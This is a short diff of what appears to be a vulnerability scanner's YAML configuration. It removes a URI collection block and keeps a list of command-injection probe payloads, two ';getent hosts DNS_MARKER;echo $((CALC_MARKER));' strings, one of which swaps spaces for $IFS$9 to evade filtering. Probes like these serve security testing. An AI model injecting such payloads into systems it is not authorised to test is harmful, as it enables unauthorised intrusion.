@@ -1,10 +1,5 @@
-collect:
-  - uniq:
-    - [ URI ]
-
 generate:
   - payload:
-
 #For QUICK scan profile. DNS_MARKER & CALC_MARKER.
     - ";getent hosts DNS_MARKER;echo $((CALC_MARKER));"
     - ";getent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER));"
